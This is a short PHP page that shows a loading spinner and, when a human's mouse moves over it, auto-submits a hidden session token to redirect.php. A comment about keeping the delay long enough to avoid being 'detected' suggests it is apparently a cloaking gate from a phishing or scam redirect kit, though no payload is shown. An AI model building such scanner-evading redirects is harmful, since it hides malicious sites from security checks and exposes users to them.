<?php
session_start();
$_SESSION['id'] = md5(uniqid());
$sesionID = $_SESSION['id'];
?>
<html>

<body onmouseover="onLoad()" id="bot">
<script>
    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    async function onLoad() {

        await sleep(1000); // Wait time before effective url redirection - Anything under 5000 may be detected so change at your own risk.  
        document.form.submit();
    }
    </script>

    <head>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
    </head>

    <div style="width: 100%; height: 100%; padding-top: 20%; padding-bottom: 20%;" class="text-center">
    <div class="spinner-border text-primary" role="status">
    </div>
    </div>

    <form method="POST" name="form" id="form" action="redirect.php">
        <input name="e84c04c00c8e6f1117a0c7c603adab81" type="hidden" value="<?php echo $sesionID; ?>">
    </form>
</body>

</html>
